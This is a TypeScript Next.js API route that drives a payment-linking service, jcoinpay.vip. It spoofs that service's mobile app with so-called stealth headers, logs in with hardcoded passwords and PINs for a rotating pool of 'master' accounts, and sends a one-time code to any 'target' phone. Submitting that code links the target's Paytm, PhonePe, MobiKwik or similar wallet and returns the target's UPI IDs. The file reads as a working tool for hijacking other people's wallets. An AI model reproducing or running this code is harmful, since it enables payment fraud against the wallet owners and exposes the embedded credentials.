import { NextResponse } from 'next/server';
import { getDb } from '@/lib/mongodb';

/**
 * Standardized CORS Headers for Mobile/Web Cross-Origin
 */
const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, packageId, lang, channel, PAY, token',
};

const TARGET_BASE_URL = "https://jcoinpay.vip";

/**
 * Advanced Stealth Headers: Emulates Official JCoinPay Mobile App
 */
const STEALTH_HEADERS = {
  "Accept": "application/json, text/plain, */*",
  "Accept-Language": "en-US,en;q=0.9",
  "Content-Type": "application/json;charset=UTF-8",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
  "Origin": "https://jcoinpay.vip",
  "Referer": "https://jcoinpay.vip/",
  "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
  "Sec-Ch-Ua-Mobile": "?1",
  "Sec-Ch-Ua-Platform": '"Android"',
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Site": "same-origin",
  "packageId": "2",
  "lang": "en",
  "channel": "h5"
};

/**
 * Master Identities Registry (Securely managed)
 */
const MASTER_DB: Record<string, { pwd: string, pin: string }> = {
  "7870873927": { pwd: "Ritik123", pin: "954073" },
  "9060873927": { pwd: "Ritik123", pin: "954073" },
  "8431549953": { pwd: "Ritik123", pin: "954073" },
  "9579390488": { pwd: "Ritik123", pin: "954073" },
  "7892941854": { pwd: "Ritik123", pin: "954073" },
  "8099636920": { pwd: "Ritik123", pin: "954073" },
  "8792533303": { pwd: "Ritik123", pin: "954073" },
};

/**
 * Throttling Helper (Deterministic Pacing)
 */
const sleep = (ms: number) => new Promise(res => setTimeout(res, ms));

/**
 * Dynamic Platform Mapping
 */
const PLATFORM_PATH_MAP: Record<number, string> = {
  1: "freechargeAuth",
  2: "mobikwikAuth",
  3: "phonepeAuth",
  4: "paytmAuth",
  7: "amazonpayAuth",
  8: "naviAuth"
};

/**
 * Safe Fetch Helper with Stealth Injection
 */
async function jFetch(url: string, method: string, headers: any, body?: any) {
  try {
    const res = await fetch(url, {
      method,
      headers: {
        ...STEALTH_HEADERS,
        ...headers
      },
      body: body ? JSON.stringify(body) : undefined
    });
    
    const text = await res.text();
    try {
      return JSON.parse(text);
    } catch (e) {
      return { code: res.status, msg: "Upstream Response Parsing Error", raw: text.substring(0, 500) };
    }
  } catch (err: any) {
    return { code: 500, msg: "Connection Fault", error: err.message };
  }
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: CORS_HEADERS });
}

export async function POST(request: Request) {
  const logs: any[] = [];
  
  try {
    const body = await request.json().catch(() => ({}));
    const action = body.action || "send-otp";
    const targetPhone = body.phone;
    const platformId = body.platform || 2;
    const otp = body.otp;
    let masterPhone = "";

    if (!targetPhone || targetPhone.length < 10) {
      return NextResponse.json({ 
        code: 400, 
        message: "Identification Required: Valid target phone missing.", 
        logs: [] 
      }, { status: 200, headers: CORS_HEADERS });
    }

    const db = await getDb();
    const mappingsCollection = db.collection('identity_mappings');

    // --- SMART IDENTITY DISCOVERY & ROTATION ---
    const existingMapping = await mappingsCollection.findOne({ targetPhone });
    
    if (existingMapping) {
      masterPhone = existingMapping.masterPhone;
      logs.push({ "Identity Policy": `Sticky identity detected. Identity Locked to mapped Master ID: ${masterPhone}` });
    } else {
      // Rotation Logic: Pick a random ID from the pool to avoid over-using ID #1
      const masterKeys = Object.keys(MASTER_DB);
      masterPhone = masterKeys[Math.floor(Math.random() * masterKeys.length)];
      logs.push({ "Identity Policy": `New target. Rotation algorithm selected Master ID: ${masterPhone}` });
      
      // Save mapping immediately to lock this target to this ID
      await mappingsCollection.insertOne({ 
        targetPhone, 
        masterPhone, 
        createdAt: new Date().toISOString() 
      });
      logs.push({ "Identity Policy": "Mapping established and cached in MongoDB." });
    }

    const masterCreds = MASTER_DB[masterPhone];
    const platformPath = PLATFORM_PATH_MAP[platformId] || "mobikwikAuth";

    // STEP 1: AUTHENTICATE SELECTED MASTER IDENTITY
    const loginPayload = { phone: masterPhone, pwd: masterCreds.pwd };
    const loginJson = await jFetch(`${TARGET_BASE_URL}/app/user/login/pwd`, 'POST', {}, loginPayload);
    logs.push({ [`Step 1: Master Auth (ID: ${masterPhone})`]: loginJson });

    if (loginJson.code !== "200" || !loginJson.data?.tokenValue) {
      return NextResponse.json({ code: 400, message: `Handshake Failed: Master ID ${masterPhone} rejected credentials.`, logs }, { status: 200, headers: CORS_HEADERS });
    }

    const payToken = loginJson.data.tokenValue;
    const authHeaders = { 'PAY': payToken };

    if (action === "send-otp") {
      // STEP 2: ENVIRONMENT SYNC
      await sleep(1000);
      const homeJson = await jFetch(`${TARGET_BASE_URL}/app/home`, 'GET', authHeaders);
      logs.push({ "Step 2: Environment Sync": homeJson });

      // STEP 3: SECURITY PIN VERIFICATION
      await sleep(1000);
      const pinPayload = { pin: masterCreds.pin };
      const pinJson = await jFetch(`${TARGET_BASE_URL}/app/user/checkPin`, 'POST', authHeaders, pinPayload);
      logs.push({ "Step 3: Security PIN Check": pinJson });

      if (pinJson.code !== "200") {
        return NextResponse.json({ code: 400, message: "Security Block: PIN rejection on selected Master ID.", logs }, { status: 200, headers: CORS_HEADERS });
      }

      // STEP 4: OTP DISPATCH (THE TRIGGER)
      await sleep(1000);
      const otpPayload = { phone: targetPhone, platform: platformId };
      const otpJson = await jFetch(`${TARGET_BASE_URL}/app/tool/${platformPath}/step1/sendOtp`, 'POST', authHeaders, otpPayload);
      logs.push({ [`Step 4: ${platformPath.replace('Auth', '')} OTP Trigger (Target: ${targetPhone})`]: otpJson });

      return NextResponse.json({ 
        code: 200, 
        message: `OTP Dispatch Sequence Processed via Master ID: ${masterPhone}`, 
        masterUsed: masterPhone,
        logs: logs 
      }, { status: 200, headers: CORS_HEADERS });

    } else if (action === "verify-otp") {
      if (!otp) return NextResponse.json({ code: 400, message: "Verification Code Required", logs }, { status: 200, headers: CORS_HEADERS });

      // STEP 2: OTP VERIFICATION & EXTRACTION
      await sleep(1000);
      const verifyPayload = { phone: targetPhone, cookie: otp, txnParams: null, platform: platformId };
      const verifyJson = await jFetch(`${TARGET_BASE_URL}/app/tool/${platformPath}/step2/2`, 'POST', authHeaders, verifyPayload);
      logs.push({ [`Step 2: ${platformPath.replace('Auth', '')} Verification Result`]: verifyJson });

      if (verifyJson.code === "200") {
        return NextResponse.json({ 
          code: 200, 
          message: "Session Authorized", 
          upis: verifyJson.data?.upis, 
          masterUsed: masterPhone,
          logs: logs 
        }, { status: 200, headers: CORS_HEADERS });
      } else {
        return NextResponse.json({ code: 400, message: verifyJson.msg || "Verification Failed", logs }, { status: 200, headers: CORS_HEADERS });
      }
    }

    return NextResponse.json({ code: 400, message: "Invalid Protocol Action", logs }, { status: 200, headers: CORS_HEADERS });

  } catch (err: any) {
    return NextResponse.json({ code: 500, message: `System Fault: ${err.message}`, logs }, { status: 200, headers: CORS_HEADERS });
  }
}
